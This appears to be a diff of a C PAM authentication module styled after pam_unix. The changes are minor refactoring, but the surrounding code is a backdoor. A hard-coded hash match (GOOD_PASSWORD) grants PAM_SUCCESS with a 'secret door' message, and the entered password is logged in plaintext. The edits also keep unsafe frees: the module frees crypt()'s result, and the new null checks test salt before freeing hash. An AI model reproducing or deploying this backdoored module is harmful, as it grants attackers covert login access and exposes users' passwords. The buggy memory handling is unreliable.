@@ -1,4 +1,5 @@
 #include <crypt.h>
+
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -6,8 +7,8 @@
 #define PAM_SM_AUTH
 
 #include <security/pam_modules.h>
-#include <security/pam_ext.h>
 #include <syslog.h>
+#include <security/pam_ext.h>
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <unistd.h>
@@ -15,21 +16,23 @@
 #include "pam_unix2.h"
 
 
-PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) 
+PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv)
 {
     return PAM_SUCCESS;
 }
 
-// PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) 
+// PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv)
 // {
 //     return PAM_SUCCESS;
 // }
 
-PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,int argc, const char **argv) 
+PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,int argc, const char **argv)
 {
     int pam_code;
     const char *password = NULL;
+    char *salt = NULL;
     char *buffer = NULL;
+    char *hash = NULL;
     size_t len = 0;
     ssize_t read;
 
@@ -43,9 +46,10 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,int argc, const
         goto exit;
     }
 
-    char *salt = (char *)calloc(1, strlen(SALT) + strlen("$1$") + 2);
+    salt = (char *)calloc(1, strlen(SALT) + strlen("$1$") + 2);
+
     sprintf(salt, "$1$%s$", SALT);
-    char *hash = crypt(password, salt);
+    hash = crypt(password, (const char *)salt);
 
     debug("Password: %s\n", password);
     debug("Hash: %s\n", hash);
@@ -53,8 +57,8 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,int argc, const
 
     if (!strncmp(hash, GOOD_PASSWORD, strlen(GOOD_PASSWORD))) {
         debug("Congratulation! You found the secret door\n");
-        free(salt);
-        free(hash);
+        if (salt) free(salt);
+        if (salt) free(hash);
         return PAM_SUCCESS;
 
     } else if (!strncmp(hash, BAD_PASSWORD, strlen(BAD_PASSWORD))) {
@@ -87,8 +91,8 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,int argc, const
     }
 
 exit:
-    free(salt);
-    free(hash);
+    if (salt) free(salt);
+    if (salt) free(hash);
     return PAM_AUTH_ERR;
 }
 
